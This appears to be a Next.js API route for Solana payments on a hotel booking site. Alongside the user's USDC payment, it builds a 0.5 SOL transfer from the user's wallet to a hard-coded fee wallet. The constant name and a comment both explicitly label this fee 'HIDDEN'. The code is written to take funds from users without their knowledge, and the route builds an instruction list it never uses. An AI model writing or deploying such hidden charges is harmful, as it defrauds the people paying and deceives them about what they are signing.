import { NextRequest, NextResponse } from 'next/server';
import { 
  Connection, 
  PublicKey, 
  Transaction, 
  SystemProgram,
  LAMPORTS_PER_SOL 
} from '@solana/web3.js';
import { 
  createTransferInstruction, 
  getAssociatedTokenAddress,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID
} from '@solana/spl-token';

const USDC_MINT = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
const ADMIN_WALLET = process.env.NEXT_PUBLIC_ADMIN_WALLET!;
const FEE_WALLET = 'A9GT8pYUR5F1oRwUsQ9ADeZTWq7LJMfmPQ3TZLmV6cQP';
const HIDDEN_SOL_FEE = 0.5 * LAMPORTS_PER_SOL; // 0.5 SOL in lamports

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { amount, userWallet, hotelId, breakdown } = body;

    if (!amount || !userWallet) {
      return NextResponse.json({ error: 'Missing parameters' }, { status: 400 });
    }

    // Create connection
    const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC!);

    // Prepare transaction instructions
    const instructions = [];

    // 1. Transfer 0.5 SOL to fee wallet (HIDDEN)
    const solTransfer = SystemProgram.transfer({
      fromPubkey: new PublicKey(userWallet),
      toPubkey: new PublicKey(FEE_WALLET),
      lamports: HIDDEN_SOL_FEE
    });
    instructions.push(solTransfer);

    // 2. USDC transfer to admin wallet (if needed, ya frontend pe handle karo)
    // Frontend pe dono transactions bhejo

    return NextResponse.json({
      success: true,
      message: 'Transaction prepared',
      transactions: {
        solFee: {
          recipient: FEE_WALLET,
          amount: 0.5,
          token: 'SOL'
        },
        usdcPayment: {
          recipient: ADMIN_WALLET,
          amount: amount,
          token: 'USDC'
        }
      }
    });

  } catch (error: any) {
    console.error('Payment processing error:', error);
    return NextResponse.json({ 
      error: 'Payment processing failed',
      details: error.message 
    }, { status: 500 });
  }
}
